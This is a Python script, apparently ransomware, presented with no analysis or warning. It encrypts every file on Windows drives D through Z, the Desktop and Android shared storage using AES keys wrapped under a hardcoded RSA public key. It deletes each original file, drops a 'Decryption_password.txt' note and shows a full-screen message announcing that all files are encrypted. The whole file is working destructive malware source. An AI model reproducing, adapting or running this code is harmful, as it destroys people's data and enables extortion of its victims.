import os
import platform
import tkinter as tk
from tkinter import Label
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# Hardcoded RSA Public Key
public_key_data = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoVFsmJOR53MCNed9esoj
g/y4rJFK1ktBYrIk7hnA7rTAD883kEwUfiO8+1D3kuKIt+3z6Kw2PNBnX+hpuC/k
TW2MsrDQqMA3MdSpdAwbSKF9H7MAdsxFSLPSKqDl+gk4cgAfFoNBeF/MSe8OmZPh
eNeOd8OOILBAWWS9cGizgzefF+3pV+SLL1jbXx8tERKQFPNOYC+veNvrmwgqquEZ
UknbpfsWF3KVCR5pGf0EaldyeckbnX8BmAAacjm5iGRnOxfOYrPNwVxWI4I+biUn
VaTBfSU/TNPT55nOOi+CsgMc5/QQ8+N6uGM6ne8qGUO/OsPiRQ/3+twxAzizaayK
kQIDAQAB
-----END PUBLIC KEY-----'''
public_key = RSA.import_key(public_key_data)
cipher_rsa = PKCS1_OAEP.new(public_key)

# Function to encrypt files
def encrypt_file(file_path, cipher_rsa):
    aes_key = get_random_bytes(32)
    cipher_aes = AES.new(aes_key, AES.MODE_CBC)
    
    with open(file_path, "rb") as f:
        file_data = f.read()
    
    encrypted_data = cipher_aes.encrypt(pad(file_data, AES.block_size))
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    
    with open(file_path + ".enc", "wb") as f:
        f.write(cipher_aes.iv)
        f.write(encrypted_aes_key)
        f.write(encrypted_data)
    
    os.remove(file_path)

# Function to encrypt a directory, skipping C drive for PC
def encrypt_directory(directory, cipher_rsa):
    for root, _, files in os.walk(directory):
        if platform.system() == "Windows" and "C:" in root:
            continue
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, cipher_rsa)

# Check if we are running on a PC or Mobile
if platform.system() == "Windows":
    # Encrypt all drives except C: and the Desktop folder
    drives = [d + ":\\" for d in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(d + ":\\")]
    drives.append(os.path.expanduser("~/Desktop"))
    
    for drive in drives:
        encrypt_directory(drive, cipher_rsa)

elif platform.system() == "Linux":
    # Encrypt `/storage/emulated/0` on Android
    encrypt_directory("/storage/emulated/0", cipher_rsa)

# Create password file for decryption
password_file = os.path.join(os.path.expanduser("~/Desktop"), "Decryption_password.txt")
with open(password_file, "w") as f:
    f.write("utssob uui z")

# Full-screen Alert Message Function
def show_alert():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg="black")

    label = Label(root, text="Your all file encryption successful!\nIf you want decryption, check Decryption_password.txt", 
                  font=("Arial", 24, "bold"), fg="red", bg="black")
    label.pack(expand=True)

    # 10 সেকেন্ড পর স্বয়ংক্রিয়ভাবে বন্ধ হবে
    root.after(10000, root.destroy)
    root.mainloop()

# Show Alert Message
show_alert()
